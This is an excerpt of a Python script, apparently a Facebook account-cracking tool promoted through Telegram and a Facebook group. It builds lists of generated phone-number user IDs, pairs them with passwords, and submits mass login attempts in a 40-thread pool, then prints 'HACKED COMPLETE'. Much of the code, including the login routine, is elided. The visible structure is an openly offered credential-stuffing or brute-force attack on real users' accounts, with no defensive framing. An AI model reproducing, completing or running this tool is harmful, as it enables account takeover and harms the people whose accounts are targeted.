# Gift By Alhaj
# Telegram Id : @habib_u54
# Telegram : https://t.me/Hbthader
# Facebook Group : https://facebook.com/groups/879179499879525/
...
\033[0;92m     ▒█▀▀█ ▒█▄▄█ \033[0;91m▒█▒█▒█ ▒█░ \033[0;92m▒█░▒█ ▒█░▒█\033[0;91m ▒█░░░ 
  \033[0;91m   ▒█░▒█ ▒█░▒█\033[0;92m ▒█░░▒█ ▄█▄ \033[0;91m▒█▄▄▀ ░▀▄▄▀ \033[0;92m▒█▄▄█""") 
...
def Hamidul():
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    Hamidul = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if Hamidul in ["1","A"]:
        Hamiduls()
    if Hamidul in ["2","B"]:
        os.system('xdg-open https://facebook.com/groups/879179499879525/')
...
def Hamiduls():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=40) as Git_Hub:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;91m╔═════════════════════════════════════╗")
        ...
        for love in user:
            ...
            uid = code+love
            Git_Hub.submit(Hamidulm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM HAMIDUL ')
    print("\033[1;91m╚═══════════════════════════╝")


def Hamidulm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
